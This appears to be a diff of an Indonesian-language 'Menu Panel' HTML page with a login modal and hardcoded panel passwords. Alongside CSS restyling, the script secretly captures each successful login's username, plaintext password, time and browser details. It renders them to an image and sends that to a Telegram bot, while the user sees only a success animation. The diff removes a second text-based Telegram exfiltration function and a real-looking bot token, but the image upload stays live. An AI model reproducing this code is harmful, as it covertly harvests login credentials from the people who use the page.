@@ -4,231 +4,219 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Menu Panel</title>
+  <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     :root {
-  --primary: #4e9af1;
-  --primary-dark: #2b6cb0;
-  --bg-dark: #0e101a;
-  --card-bg: #181b28;
-  --text: #f1f1f1;
-  --success: #2ecc71;
-  --danger: #e74c3c;
-  --glow: rgba(78, 154, 241, 0.5);
-}
+      --primary: #4e9af1;
+      --bg: #0d1117;
+      --card: #161b22;
+      --text: #e6edf3;
+      --success: #2ecc71;
+      --danger: #e74c3c;
+      --shadow: rgba(78, 154, 241, 0.3);
+    }
 
-* {
-  box-sizing: border-box;
-}
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-body {
-  margin: 0;
-  padding: 60px 20px;
-  font-family: 'Segoe UI', sans-serif;
-  background: linear-gradient(135deg, #0e101a, #141824);
-  color: var(--text);
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  min-height: 100vh;
-}
+    body {
+      background: var(--bg);
+      font-family: 'Urbanist', sans-serif;
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 60px 20px;
+      min-height: 100vh;
+    }
 
-h1 {
-  font-size: 2.4rem;
-  margin-bottom: 30px;
-  font-weight: 600;
-  color: var(--primary);
-  text-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
-}
+    h1 {
+      font-size: 2.7em;
+      margin-bottom: 40px;
+      color: var(--primary);
+      font-weight: 700;
+      text-shadow: 0 0 12px var(--shadow);
+    }
 
-#menuContainer {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-  gap: 20px;
-  width: 100%;
-  max-width: 1000px;
-}
+    #menuContainer {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 30px;
+      width: 100%;
+      max-width: 960px;
+    }
 
-.panel-button {
-  background: rgba(30, 35, 50, 0.6);
-  border: 1px solid rgba(255, 255, 255, 0.1);
-  backdrop-filter: blur(12px);
-  border-radius: 16px;
-  padding: 20px;
-  font-size: 1rem;
-  color: var(--text);
-  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-  cursor: pointer;
-  transition: all 0.3s ease;
-}
+    .panel-button {
+      background: var(--card);
+      border: 1px solid transparent;
+      border-radius: 20px;
+      padding: 20px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--text);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2), 0 0 0 transparent;
+      transition: all 0.3s ease;
+      cursor: pointer;
+      text-align: center;
+    }
 
-.panel-button:hover {
-  transform: translateY(-6px);
-  background-color: var(--primary-dark);
-  color: #fff;
-  box-shadow: 0 0 20px var(--glow);
-}
+    .panel-button:hover {
+      background-color: #1f2937;
+      box-shadow: 0 0 20px var(--shadow), 0 0 10px var(--primary);
+      transform: translateY(-6px) scale(1.02);
+      border-color: var(--primary);
+    }
 
-.login-form,
-.overlay {
-  position: fixed;
-  top: 0; left: 0;
-  width: 100%; height: 100%;
-  display: none;
-  z-index: 1000;
-}
+    .overlay, .login-form {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+    }
 
-.overlay {
-  background: rgba(0, 0, 0, 0.5);
-}
+    .overlay {
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 1000;
+      display: none;
+    }
 
-.login-form {
-  display: none;
-  justify-content: center;
-  align-items: center;
-  z-index: 1001;
-}
+    .login-form {
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1001;
+    }
 
-.login-box {
-  background: var(--card-bg);
-  padding: 28px 25px;
-  border-radius: 14px;
-  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
-  width: 320px;
-  animation: scaleUp 0.4s ease-out;
-  text-align: center;
-}
+    .login-box {
+      background: var(--card);
+      padding: 30px;
+      border-radius: 16px;
+      width: 320px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+      animation: scaleUp 0.4s ease-out;
+    }
 
-.login-box h3 {
-  font-size: 1.2rem;
-  color: var(--primary);
-  margin-bottom: 16px;
-}
+    @keyframes scaleUp {
+      from { transform: scale(0.85); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
 
-input[type="text"],
-input[type="password"] {
-  width: 100%;
-  padding: 10px 14px;
-  margin: 10px 0;
-  border-radius: 8px;
-  border: none;
-  background: #2b2f40;
-  color: #fff;
-  outline: none;
-  transition: 0.3s;
-}
+    .login-box h3 {
+      margin-bottom: 20px;
+      font-size: 1.3em;
+      color: var(--primary);
+    }
 
-input[type="text"]:focus,
-input[type="password"]:focus {
-  border: 2px solid var(--primary);
-  background: #353a50;
-}
+    input[type="text"], input[type="password"] {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      background: #21262d;
+      color: white;
+      font-size: 1rem;
+      transition: border 0.3s;
+    }
 
-.login-box button {
-  margin: 10px 5px;
-  padding: 10px 18px;
-  border-radius: 8px;
-  font-weight: 600;
-  font-size: 0.95rem;
-  cursor: pointer;
-  border: none;
-  transition: background 0.3s ease;
-}
+    input:focus {
+      border: 1px solid var(--primary);
+      outline: none;
+    }
 
-.login-box button:first-child {
-  background: var(--success);
-  color: white;
-}
+    .login-box button {
+      margin: 10px 6px;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 10px;
+      font-weight: 600;
+      font-size: 0.95rem;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
 
-.login-box button:first-child:hover {
-  background: #219150;
-}
+    .login-box button:first-child {
+      background-color: var(--success);
+      color: white;
+    }
 
-.login-box button:last-child {
-  background: var(--danger);
-  color: white;
-}
+    .login-box button:first-child:hover {
+      background-color: #28b164;
+    }
 
-.login-box button:last-child:hover {
-  background: #c0392b;
-}
+    .login-box button:last-child {
+      background-color: var(--danger);
+      color: white;
+    }
 
-#notif {
-  position: fixed;
-  bottom: 20px;
-  left: 50%;
-  transform: translateX(-50%);
-  background: #222633;
-  color: white;
-  padding: 12px 20px;
-  border-radius: 10px;
-  font-size: 0.95rem;
-  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
-  display: none;
-  z-index: 1100;
-}
+    .login-box button:last-child:hover {
+      background-color: #c0392b;
+    }
 
-#successAnimation {
-  position: fixed;
-  top: 0; left: 0;
-  width: 100%; height: 100%;
-  background: rgba(0, 0, 0, 0.85);
-  display: none;
-  align-items: center;
-  justify-content: center;
-  z-index: 2000;
-  animation: fadeIn 0.5s ease-out;
-}
+    #notif {
+      position: fixed;
+      bottom: 25px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #2a2d3c;
+      color: #fff;
+      padding: 14px 24px;
+      border-radius: 12px;
+      display: none;
+      z-index: 1002;
+      font-size: 0.95rem;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.4);
+    }
 
-.success-box {
-  text-align: center;
-  animation: popIn 0.6s ease-out;
-}
+    #successAnimation {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      z-index: 2000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
 
-.checkmark {
-  width: 80px;
-  height: 80px;
-  border-radius: 50%;
-  border: 5px solid var(--success);
-  border-left-color: transparent;
-  margin: 0 auto 20px;
-  animation: rotate 1s ease-out forwards;
-}
+    .success-box {
+      text-align: center;
+      animation: popIn 0.6s ease-out;
+    }
 
-.success-box p {
-  color: var(--success);
-  font-size: 1.5rem;
-  font-weight: bold;
-}
+    .checkmark {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      border: 6px solid var(--success);
+      border-left-color: transparent;
+      animation: rotate 1s linear forwards;
+      margin: 0 auto 20px;
+    }
 
-@keyframes rotate {
-  0% { transform: rotate(0); }
-  100% { transform: rotate(360deg); }
-}
+    .success-box p {
+      font-size: 1.5rem;
+      color: var(--success);
+      font-weight: bold;
+    }
 
-@keyframes scaleUp {
-  from { transform: scale(0.7); opacity: 0; }
-  to { transform: scale(1); opacity: 1; }
-}
+    @keyframes rotate {
+      0% { transform: rotate(0); }
+      100% { transform: rotate(360deg); }
+    }
 
-@keyframes scaleDown {
-  from { transform: scale(1); opacity: 1; }
-  to { transform: scale(0.9); opacity: 0; }
-}
-
-@keyframes popIn {
-  from { transform: scale(0.7); opacity: 0; }
-  to { transform: scale(1); opacity: 1; }
-}
-
-@keyframes fadeIn {
-  from { opacity: 0; }
-  to { opacity: 1; }
-}
+    @keyframes popIn {
+      from { transform: scale(0.7); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
   </style>
 </head>
 <body>
   <h1>Menu Panel</h1>
   <div id="menuContainer"></div>
+
   <div class="overlay" id="overlay"></div>
   <div class="login-form" id="loginForm">
     <div class="login-box">
@@ -239,21 +227,24 @@ input[type="password"]:focus {
       <button onclick="closeForm()">Batal</button>
     </div>
   </div>
+
   <div id="notif"></div>
   <div id="captureArea" style="display:none;">
     <div id="reportText"></div>
   </div>
-  <!-- ANIMASI LOGIN BERHASIL -->
+
   <div id="successAnimation">
     <div class="success-box">
       <div class="checkmark"></div>
       <p>Berhasil Masuk</p>
     </div>
   </div>
+
   <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
   <script>
-    const telegramToken = "7847987165:AAExaFfM8F2eWgJc_0TG8k3xx3uiQKAOZxE";
-    const chatId = "7274253936";
+    const telegramToken = "YOUR_BOT_TOKEN";
+    const chatId = "YOUR_CHAT_ID";
+
     const panels = [
       { name: "PRIBADIFAAN", user: "faan", pass: "OCTA", url: "https://example.com/pribadifaan" },
       { name: "PT JASTEB 1", user: "admin", pass: "111", url: "https://example.com/jasteb" },
@@ -263,7 +254,6 @@ input[type="password"]:focus {
     ];
 
     let selectedPanel = null;
-    let locationData = "Tidak tersedia";
 
     function renderButtons() {
       const container = document.getElementById("menuContainer");
@@ -284,14 +274,16 @@ input[type="password"]:focus {
     }
 
     function closeForm() {
-      const loginForm = document.getElementById("loginForm");
-      const box = loginForm.querySelector(".login-box");
-      box.style.animation = "scaleDown 0.3s ease-in-out";
-      setTimeout(() => {
-        document.getElementById("overlay").style.display = "none";
-        loginForm.style.display = "none";
-        box.style.animation = "";
-      }, 300);
+      document.getElementById("overlay").style.display = "none";
+      document.getElementById("loginForm").style.display = "none";
+    }
+
+    function showNotif(message, color = "#444") {
+      const notif = document.getElementById("notif");
+      notif.style.background = color;
+      notif.textContent = message;
+      notif.style.display = "block";
+      setTimeout(() => notif.style.display = "none", 3000);
     }
 
     function submitLogin() {
@@ -301,19 +293,13 @@ input[type="password"]:focus {
 
       if (username === selectedPanel.user && password === selectedPanel.pass) {
         showNotif("Login berhasil", "#2ecc71");
-
         const reportHTML = `
-          <b>Login Panel:</b> ${selectedPanel.name}<br>
+          <b>Panel:</b> ${selectedPanel.name}<br>
           <b>Username:</b> ${username}<br>
           <b>Password:</b> ${password}<br>
           <b>Waktu:</b> ${new Date().toLocaleString()}<br>
-          <b>Device:</b> ${navigator.userAgent}<br>
-          <b>Info Lokasi:</b> ${locationData}
+          <b>Device:</b> ${navigator.userAgent}
         `;
-        
-        // Kirim laporan ke Telegram
-        sendReportToTelegram(selectedPanel.name, username, password, locationData);
-
         document.getElementById("reportText").innerHTML = reportHTML;
         html2canvas(document.getElementById("captureArea")).then(canvas => {
           sendImageToTelegram(canvas);
@@ -329,14 +315,6 @@ input[type="password"]:focus {
       }
     }
 
-    function showNotif(message, color = "#444") {
-      const notif = document.getElementById("notif");
-      notif.style.background = color;
-      notif.textContent = message;
-      notif.style.display = "block";
-      setTimeout(() => notif.style.display = "none", 3000);
-    }
-
     function sendImageToTelegram(canvas) {
       canvas.toBlob(blob => {
         const formData = new FormData();
@@ -347,19 +325,6 @@ input[type="password"]:focus {
           body: formData
         });
       });
-    }
-
-    function sendReportToTelegram(panelName, username, password, location) {
-      const message = `
-        <b>Panel:</b> ${panelName}
-        <b>Username:</b> ${username}
-        <b>Password:</b> ${password}
-        <b>Waktu:</b> ${new Date().toLocaleString()}
-        <b>Device:</b> ${navigator.userAgent}
-        <b>Lokasi:</b> ${location}
-      `;
-      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
-      fetch(url);
     }
 
     window.onload = renderButtons;
